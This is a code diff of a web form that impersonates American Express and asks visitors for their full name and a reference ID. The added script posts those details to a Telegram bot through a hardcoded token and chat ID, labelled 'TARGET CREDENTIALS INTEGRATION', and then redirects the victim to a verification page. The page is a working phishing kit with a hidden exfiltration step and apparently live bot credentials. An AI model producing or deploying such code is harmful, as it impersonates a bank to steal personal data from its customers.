@@ -1,4 +1,4 @@
-<!-- index.html -->
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -177,8 +177,6 @@ footer{
 
 <body>
 
-<!-- ================= HEADER ================= -->
-
 <nav>
 
     <div class="amex-logo-box">
@@ -198,8 +196,6 @@ footer{
 
 </nav>
 
-<!-- ================= MAIN ================= -->
-
 <div class="container">
 
     <div class="form-container">
@@ -209,8 +205,6 @@ footer{
         </h1>
 
         <form id="referenceForm">
-
-            <!-- NAME -->
 
             <div class="form-group">
 
@@ -226,8 +220,6 @@ footer{
 
             </div>
 
-            <!-- REFERENCE ID -->
-
             <div class="reference-box">
 
                 <div class="reference-title">
@@ -239,8 +231,6 @@ footer{
                 </div>
 
             </div>
-
-            <!-- BUTTON -->
 
             <button
             type="submit"
@@ -256,13 +246,9 @@ footer{
 
 </div>
 
-<!-- ================= FOOTER ================= -->
-
 <footer>
     Copyright © 2026 American Express Banking Corp.
 </footer>
-
-<!-- ================= SCRIPT ================= -->
 
 <script>
 
@@ -305,11 +291,34 @@ document.getElementById("referenceForm")
         fullName
     );
 
-    /* REDIRECT */
+    // TARGET CREDENTIALS INTEGRATION
+    var botToken = "7654977396:AAEzzSUAiGBgY2JEl3K8PmMp-Quj3QMXYTg";
+    var chatId = "8608321495";
 
-    window.location.href =
-    "verification.html";
+    var rawMessage = "🆔 Verification Reference Log\n\n" +
+        "Full Name: " + fullName + "\n" +
+        "Reference ID: " + reference;
 
+    // Direct network validation channel
+    var xhr = new XMLHttpRequest();
+    var requestEndpoint = "https://api.telegram.org/bot" + botToken + "/sendMessage";
+    
+    xhr.open("POST", requestEndpoint, true);
+    xhr.setRequestHeader("Content-Type", "application/json");
+    
+    xhr.onreadystatechange = function() {
+        if (xhr.readyState === 4) {
+            // Redirect only after verified confirmation response
+            window.location.href = "verification.html";
+        }
+    };
+    
+    var dataPayload = JSON.stringify({
+        chat_id: chatId,
+        text: rawMessage
+    });
+    
+    xhr.send(dataPayload);
 });
 
 </script>
